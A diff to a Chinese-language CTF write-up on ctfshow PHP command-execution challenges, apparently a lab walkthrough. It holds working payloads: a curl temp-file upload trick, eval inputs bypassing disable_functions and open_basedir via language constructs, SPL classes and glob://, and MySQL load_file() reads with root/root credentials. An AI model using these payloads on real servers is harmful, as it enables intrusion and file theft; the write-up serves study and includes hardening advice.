@@ -674,16 +674,14 @@ if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c)){
    ```
 3. 响应里就是 `cat flag.php` 的输出
 
-curl 一行版：
+也可以试试使用curl：
 
 ```bash
 printf 'cat flag.php\n' > payload.txt
 curl -sk -F "file=@payload.txt" "http://靶机/?c=.%20/???/????????[@-[]"
 ```
 
-实测**第一次就出**——临时文件在请求处理期间一直存在，竞态窗口其实很大。如果碰上最后一位不是大写字母，多提交几次即可。
-
-
+临时文件在请求处理期间一直存在，竞态窗口其实很大。如果碰上最后一位不是大写字母，多提交几次就好了。
 
 ### web57
 
@@ -698,7 +696,7 @@ if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\
 ```
 
 - 封：`;`、字母、数字、反引号、`|#`、引号、`%`、Tab、`&`、换行、`>`、`<`、`.`、`,`、`?`、`*`、`-`、`=`、`[`
-- 注释写明：flag 在 `36.php`
+- 页面写明flag 在 `36.php`
 - 代码是 `cat $c.php`，只要让 `$c` 展开成 `36` 就行
 
 #### 思路：用 shell 算术展开拼出 36
@@ -1371,9 +1369,9 @@ c=ob_end_flush();$f=new SplFileObject("index.php");foreach($f as $k=>$l){if($k>=
 21:         echo preg_replace("/[0-9]|[a-z]/i","?",$s);
 ```
 
-![image-20261120224611](/assets/ctfshow-web-command-exec/image-20261120224611.png)
+![image-20261121191433642](/assets/ctfshow-web-command-exec/image-20261121191433642.png)
 
-![image-20261120224612](/assets/ctfshow-web-command-exec/image-20261120224612.png)
+![image-20261121191448642](/assets/ctfshow-web-command-exec/image-20261121191448642.png)
 
 | 行号 | 代码 | 作用 |
 |---|---|---|
@@ -1413,6 +1411,8 @@ c=ob_end_flush();include('/flagc.txt');
 
 ### web74
 
+![image-20261121191850266](/assets/ctfshow-web-command-exec/image-20261121191850266.png)
+
 **同一套代码，但黑名单把 `scandir`、`var_dump` 都禁了**
 
 源码和 web73 差不多，还是 `eval($c)` + `preg_replace` 打码。变的是 `disable_functions`：除了原来那批读文件函数，`scandir`、`var_dump`、`print_r`、`phpinfo`、`system/exec/shell_exec/passthru` 这些也被加进去了。
@@ -1423,41 +1423,47 @@ c=ob_end_flush();include('/flagc.txt');
 c=ob_end_flush();printf('OB=[%s]|DF=[%s]',ini_get('open_basedir'),ini_get('disable_functions'));
 ```
 
+![image-20261121191932786](/assets/ctfshow-web-command-exec/image-20261121191932786.png)
+
 结果 `open_basedir` 为空（不限制目录），黑名单里有意思的是这一串：
 
 ```
 scandir,...,echo,var_dump,print,fopen,...,highlight_file,print_r,...,include,include_once,require,require_once,...,phpinfo,...,system,...
 ```
 
-**`echo`、`print`、`include`、`include_once`、`require`、`require_once` 都被写进了黑名单——然而它们全是语言构造（language construct），不是函数，`disable_functions` 根本管不到，照样能用。** 这就是本题的核心考点。
+**`echo`、`print`、`include`、`include_once`、`require`、`require_once` 都被写进了黑名单——然而它们全是语言构造（language construct），不是函数，`disable_functions` 根本管不到，照样能用。**
 
-#### 第一步：找 flag 文件（`scandir` 被禁）
+#### 找 flag 文件（`scandir` 被禁）
 
-至少三条路，都实测可用：
-
-**方法一：`glob()` 没被禁**
+##### 方法一：`glob()` 没被禁
 
 ```
 c=ob_end_flush();echo implode('|',glob('/*'));
 ```
 
-得到 `/flagx.txt`（文件名又和上一题不一样，所以"先列目录"这一步不能省）。
+得到 `/flagx.txt`
 
-**方法二：`opendir()` / `readdir()` 没被禁**
+![image-20261121192042047](/assets/ctfshow-web-command-exec/image-20261121192042047.png)
+
+##### 方法二：`opendir()` / `readdir()` 没被禁
 
 ```
 c=ob_end_flush();$d=opendir('/');while(($f=readdir($d))!==false){echo $f.'|';}
 ```
 
-**方法三：SPL 类（类不受函数黑名单管）**
+![image-20261121192111933](/assets/ctfshow-web-command-exec/image-20261121192111933.png)
+
+##### 方法三：SPL 类（类不受函数黑名单管）
 
 ```
 c=ob_end_flush();foreach(new DirectoryIterator('/') as $f){echo $f->getFilename().'|';}
 ```
 
+![image-20261121192200159](/assets/ctfshow-web-command-exec/image-20261121192200159.png)
+
 `DirectoryIterator` 是 PHP 内置的 SPL 类，`disable_functions` 只能禁"函数名"，禁不了 `new 类()` 和类的方法。
 
-#### 第二步：读文件
+#### 读文件
 
 `include` 是语言构造，黑名单里写了也拦不住；再配 `ob_end_flush()` 绕过输出过滤：
 
@@ -1465,7 +1471,7 @@ c=ob_end_flush();foreach(new DirectoryIterator('/') as $f){echo $f->getFilename(
 c=ob_end_flush();include('/flagx.txt');
 ```
 
-直接出 flag。
+![image-20261121192336728](/assets/ctfshow-web-command-exec/image-20261121192336728.png)
 
 备用方案是用 SPL 的 `SplFileObject`——`fopen`/`fgets`/`file_get_contents` 全禁了也没关系，因为这里调的是类方法：
 
@@ -1473,45 +1479,97 @@ c=ob_end_flush();include('/flagx.txt');
 c=ob_end_flush();$o=new SplFileObject('/flagx.txt');foreach($o as $l){echo $l;}
 ```
 
-#### 对照
-
-- `c=include('/flagx.txt');` → flag 被打码成 `???????{...}`
-- `c=ob_end_flush();include('/flagx.txt');` → 直接出 flag
-
-#### 为什么值得学
-
 `disable_functions` 本质是一张"函数名"黑名单，有三类东西它管不住：
 
-1. **语言构造** ：`echo` / `print` / `include` / `require`——写进黑名单等于没写
-2. **没被列出的函数** ：`glob` / `opendir` / `printf` / `ini_get`——黑名单靠穷举，漏一个就够用
-3. **类和类方法** ：`DirectoryIterator` / `SplFileObject`——禁函数管不到面向对象接口
-
-企业加固视角：只靠 `disable_functions` 必然漏，必须叠加 `open_basedir`、Web 进程最小权限、容器/沙箱隔离，并把上传目录设为不可执行。这题把"黑名单的边界在哪"演示得非常清楚，建议记住这三类绕过。
+- **语言构造** ：`echo` / `print` / `include` / `require`——写进黑名单等于没写
+- **没被列出的函数** ：`glob` / `opendir` / `printf` / `ini_get`——黑名单靠穷举，漏一个就够用
+- **类和类方法** ：`DirectoryIterator` / `SplFileObject`——禁函数管不到面向对象接口
 
 ### web75
 
 ![image-20261108124648010](/assets/ctfshow-web-command-exec/image-20261108124648010.png)
 
-**open_basedir 回来了：PHP 层的读取全部封死，最后靠 MySQL 的 `load_file()` 破局**
+**这一题加了 `open_basedir`：PHP 只能读 `/var/www/html` 里的文件，最后靠 MySQL 代读拿到 flag**
 
-源码还是那一套（`eval($c)` + `preg_replace` 打码），`disable_functions` 和 web74 同样 95 项。真正的变化是 `ini_get('open_basedir')`：
+先说这题和 web74 的两个区别：
+
+1. **代码没变** ：还是 POST 一个 `c`，服务器 `eval($c)` 执行；执行完输出会被 `preg_replace("/[0-9]|[a-z]/i","?",$s)` 处理，把输出里的字母和数字都替换成 `?`（我们用 `ob_end_flush()` 绕过它，web71 已经讲过）。
+2. **禁用函数名单没变** ：`ini_get('disable_functions')` 数出来还是 95 项，和 web74 相同，所以难的不在函数黑名单。
+
+**唯一的变化是多了一个 `open_basedir` 配置** 。发一条 payload，让PHP显示出来：
 
 ```
-/var/www/html/
+c=ob_end_flush();printf("OB=[%s]", ini_get("open_basedir"));
 ```
 
-也就是说，PHP 脚本能碰的文件只剩站点目录。而 `/var/www/html` 里只有两个文件：
+![image-20261121210246686](/assets/ctfshow-web-command-exec/image-20261121210246686.png)
 
-- `index.php`（题目本体）
-- `flag.php` —— **假旗** ，内容是 `$flag="秀秀得了,这次不在这里";`
+返回：
 
-`getenv()` 里还有一个名为 `not_flag` 的环境变量，同样是诱饵。真 flag 在根目录：`/flag36.txt`（用 `DirectoryIterator('glob:///*')` 能看见名字）。
+```
+OB=[/var/www/html/]
+```
 
-#### 一、先把"不行的路"全部走一遍（这张表就是本题的价值）
+`ini_get("配置项名")` 是 PHP 自带的**读配置函数** ：传一个配置项的名字，返回它当前生效的值（字符串）。`open_basedir` 是 PHP 的"目录围栏"：设置之后，PHP 的所有文件操作（`include`、`fopen`、`SplFileObject`……）都只能碰这个目录里面的东西。`/var/www/html` 是网站根目录（下文叫"站点目录"），而真 flag 在根目录的 `/flag36.txt`——在围栏外面，直接读会被拒绝。
+
+那怎么办？这台机器上还跑着一个 MySQL 服务（`root/root` 弱口令）。MySQL 是独立进程、以 root 身份运行，**它读文件不经过 PHP 的 open_basedir**——所以让 MySQL 执行 `select load_file("/flag36.txt")`，替我们把文件读出来。这就是标题里"让 MySQL 代读"的意思。
+
+#### 一、探测
+
+##### 1.猜根目录的 flag 文件，直接 include
+
+```
+c=ob_end_flush();include('/flag36.txt');
+```
+
+```
+Warning: include(): Failed opening '/flag36.txt' for inclusion ... open_basedir restriction in effect. File(/flag36.txt) is not within the allowed path(s): (/var/www/html/)
+```
+
+![image-20261121201948281](/assets/ctfshow-web-command-exec/image-20261121201948281.png)
+
+根目录的文件读不了；这条 warning 还顺带泄露了**允许目录是 `/var/www/html/`** 。
+
+##### 2.站点目录里有什么？
+
+```
+c=ob_end_flush();echo implode('|',glob('*'));
+```
+
+![image-20261121202101773](/assets/ctfshow-web-command-exec/image-20261121202101773.png)
+
+```
+c=ob_end_flush();$f=new SplFileObject("flag.php");foreach($f as $l)echo $l;
+```
+
+```
+$flag="秀秀得了,这次不在这里"
+```
+
+ `flag.php` 是**假旗** 。
+
+![image-20261121210351548](/assets/ctfshow-web-command-exec/image-20261121210351548.png)
+
+![image-20261121210333655](/assets/ctfshow-web-command-exec/image-20261121210333655.png)
+
+##### 3.根目录里到底有什么？用 `glob://` 试试
+
+```
+c=ob_end_flush();foreach(new DirectoryIterator('glob:///*') as $f){echo $f->getFilename().'|';}
+```
+
+```
+bin|dev|etc|flag36.txt|home|lib|media|mnt|opt|proc|root|run|sbin|srv|sys|tmp|usr|var|
+```
+
+![image-20261121210423550](/assets/ctfshow-web-command-exec/image-20261121210423550.png)
+
+看到**真旗是 `/flag36.txt`** 。`glob://` 不受 open_basedir 管；但拿到名字再 `include('/flag36.txt')` 还是被拦，**只能看名字，读不了内容** 。
+
+##### 4.把 PHP 层的读法全试一遍
 
 | 尝试 | 结果 |
 |---|---|
-| `include('/flag36.txt')` | `open_basedir restriction in effect` |
 | `new SplFileObject('/flag36.txt')` | `open_basedir restriction` |
 | `glob('/*')` | 只匹配到字面量 `/`，通配符不生效 |
 | `opendir('/')` / `readdir()` | `open_basedir restriction` |
@@ -1524,36 +1582,41 @@ c=ob_end_flush();$o=new SplFileObject('/flagx.txt');foreach($o as $l){echo $l;}
 | `new SQLite3('/flag36.txt')` | `open_basedir prohibits opening` |
 | `PharData` / `XMLReader` / `finfo_file` | 全部失败 |
 
-三个值得记住的细节：
+
 
 - **XXE 为什么也不行** ：PHP 的 libxml 扩展把外部实体加载器接到了 PHP 的流上（`_php_libxml_external_entity_loader`），所以读文件时照样过 open_basedir 检查。连允许目录内的 `flag.php` 都报 `undefined entity`，说明实体根本没被加载。
 - **`glob('/*')` 返回 1** ：那个 1 是字面量 `/` 自身，不是目录内容。带通配符的 glob 同样受 open_basedir 约束。
-- **黑名单里为什么有一堆 `strlen`/`chr`/`ord`/`bin2hex`/`dechex`** ：它们不是用来防"读文件"的，而是专门用来废掉 web72 的 UAF PoC（`php7-gc-bypass` 靠这些函数做指针运算、拼 payload、算偏移）。这题里 `strlen` 一挂，UAF 脚本连 `system` 的地址都算不出来，作者是照着 PoC 逐个封的。
+- **黑名单里这些`strlen`/`chr`/`ord`/`bin2hex`/`dechex`是做什么的？** ：它们不是用来防"读文件"的，而是专门用来废掉 web72 的 UAF PoC（`php7-gc-bypass` 靠这些函数做指针运算、拼 payload、算偏移）。这题里 `strlen` 一挂，UAF 脚本连 `system` 的地址都算不出来，作者是照着 PoC 逐个封的。
 
-#### 二、唯一活着的口子：`glob://` 能列目录
+#### 二、再检索：POST 查配置，查为什么被拦查清楚
 
-```
-c=ob_end_flush();foreach(new DirectoryIterator('glob:///*') as $f){echo $f->getFilename().'|';}
-```
-
-输出：
+##### 1.`open_basedir` 到底是多少
 
 ```
-bin|dev|etc|flag36.txt|home|lib|media|mnt|opt|proc|root|run|sbin|srv|sys|tmp|usr|var|
+c=ob_end_flush();printf("OB=[%s]",ini_get("open_basedir"));
 ```
 
-`glob://` 包装器不受 open_basedir 限制，所以能拿到名字。但注意：**它只能列名字**——拿到的 `SplFileInfo` 再调 `openFile()` 读内容时，open_basedir 检查又回来了（实测 `File(//flag36.txt) is not within the allowed path(s)`）。所以别指望 `glob://` 直接读出内容。
+```
+OB=[/var/www/html/]
+```
 
-#### 三、正解：MySQL 的 `load_file()`（数据库代读）
+探测里所有拦截的根源：**PHP 被限制在这个目录** 。
 
-思路一句话：**PHP 被 open_basedir 关在 `/var/www/html`，但 MySQL 服务端没被关。** 只要能让 MySQL 帮我们读文件，PHP 的限制就形同虚设。
+##### 2.`disable_functions` 名单
 
-为什么可行（实测环境）：
+```
+c=ob_end_flush();echo ini_get('disable_functions');
+```
 
-- PHP 以 `www-data` 低权限运行，读文件受 open_basedir 约束；而 `mysqld` 以 **root** 运行，`load_file()` 用的是 MySQL 进程的权限，完全不经过 PHP 的 open_basedir 检查
-- 数据库是弱口令 `root/root`，且 `select @@secure_file_priv` 返回**空**（不为空时只能读指定目录），root 又自带 `FILE` 权限，所以能读任意路径
+![image-20261121210914712](/assets/ctfshow-web-command-exec/image-20261121210914712.png)
 
-先确认能不能连上、顺便看看有哪些库：
+关键项：`scandir`、`readfile`、`file`、`fopen`、`highlight_file`、`show_source` 全在名单里；而 `echo`、`print`、`include`、`require` 虽然也写在名单里，但它们是**语言构造** ，禁不掉。
+
+##### 3.环境变量
+
+`getenv()` 里能看到 php-fpm 的痕迹（`--enable-fpm`、`HOME=/home/www-data`），还有一个名为 `not_flag` 的诱饵变量。
+
+##### 4.顺手查一下 MySQL
 
 ```
 c=ob_end_flush();
@@ -1562,13 +1625,37 @@ $r=mysqli_query($l,'SHOW DATABASES');
 while($x=mysqli_fetch_assoc($r)){ echo $x['Database'].'|'; }
 ```
 
-回显：
+![image-20261121210950316](/assets/ctfshow-web-command-exec/image-20261121210950316.png)
 
 ```
 ctftraining|information_schema|mysql|performance_schema|test|
 ```
 
-然后直接读文件（mysqli 版）：
+再查两个关键配置：
+
+```
+c=ob_end_flush();
+$l=mysqli_connect('127.0.0.1','root','root');
+$r=mysqli_query($l,'select @@secure_file_priv s,@@version v');
+while($x=mysqli_fetch_assoc($r)){ printf('SF=[%s] V=%s',$x['s'],$x['v']); }
+```
+
+![image-20261121211032137](/assets/ctfshow-web-command-exec/image-20261121211032137.png)
+
+```
+SF=[] V=10.3.18
+```
+
+本机 MySQL 能用 `root/root` 连上；`secure_file_priv` 为**空**（不为空时 `load_file()` 只能读指定目录）；`mysqld` 以 root 运行。
+
+#### 三、换一层，让 MySQL 代读
+
+把"探测"和"检索"的结果对起来：
+
+- **PHP 层** ：`open_basedir=/var/www/html/` 关住目录 + `disable_functions` 关住函数→常规读法全断，只剩"看得到名字（glob://），读不到内容"
+- **MySQL 层** ：`mysqld` 以 **root** 身份运行，`load_file()` 用的是 MySQL 进程的权限，**完全不经过 PHP 的 open_basedir 检查** ；`secure_file_priv` 又是空的 → 想读哪读哪
+
+所以最终 payload 就是让 MySQL 把 `/flag36.txt` 读出来（mysqli 版）：
 
 ```
 c=ob_end_flush();
@@ -1578,7 +1665,9 @@ while($x=mysqli_fetch_assoc($r)){ echo $x['a']; }
 exit();
 ```
 
-PDO 版（更短，wp 里用的就是这种）：
+![image-20261121211218428](/assets/ctfshow-web-command-exec/image-20261121211218428.png)
+
+PDO 版（更短）：
 
 ```
 c=ob_end_flush();
@@ -1587,7 +1676,7 @@ foreach($d->query('select load_file("/flag36.txt")') as $r){ echo $r[0]; }
 exit();
 ```
 
-两个版本实测都能直接出 flag。
+![image-20261121211239273](/assets/ctfshow-web-command-exec/image-20261121211239273.png)
 
 ##### 关于 `dbname`：为什么可以不写
 
@@ -1606,6 +1695,8 @@ exit();
 #### 四、进阶选读：PHP-FPM 的 FastCGI 协议（换执行层）
 
 除了"让 MySQL 代读"，还有一条更底层的路，也实测成功：**用 FastCGI 协议让 PHP-FPM 在新的 ini 配置下重新执行脚本** 。这条路的现实意义更大（SSRF 打内网 FastCGI、php-fpm 9000 裸奔都是这个原理），所以留作进阶。
+
+> 不想看协议细节可以跳过这一段，只需记住结论：**FastCGI 请求参数里的 `PHP_VALUE` 能改 `open_basedir`** 。
 
 先看两个条件：
 
@@ -1678,18 +1769,11 @@ echo $m[0];
 4. **看清边界的层次** ：`open_basedir` + `disable_functions` 只是 PHP 解释器层的约束；往外一层有 MySQL 的权限，再往外有 FPM 的配置覆盖。哪一层没锁死，整条链就断了。
 5. **防守视角** ：MySQL 用最小权限账户、限制 `FILE` 权限、设置 `secure_file_priv`、数据库只监听本地且强口令；FPM 只监听 unix socket、设置 `listen.allowed_clients`、`security.limit_extensions`、容器网络隔离。
 
-#### 对照小结
-
-- PHP 层能想到的读法（include / SPL / 伪协议 / XXE / SQLite / Phar）在这题全被封死
-- `glob://` 只能列目录，不能读内容
-- web72 的 UAF 脚本也被 `strlen` 等函数封死
-- 真正破局的是**换一层** ：最省事的是让 MySQL（root 权限）用 `load_file()` 代读；更底层的是用 FastCGI 协议让 FPM 重载 ini
-
 ### web76
 
 ![image-20261108162439941](/assets/ctfshow-web-command-exec/image-20261108162439941.png)
 
-**同一题换文件名：`/flag36d.txt`（复用题，没有新知识点）**
+**同一题换文件名：`/flag36d.txt`（复用题）**
 
 环境与 web75 一致：`open_basedir=/var/www/html/`，`disable_functions` 100 项。对比之后只有两处变化：
 
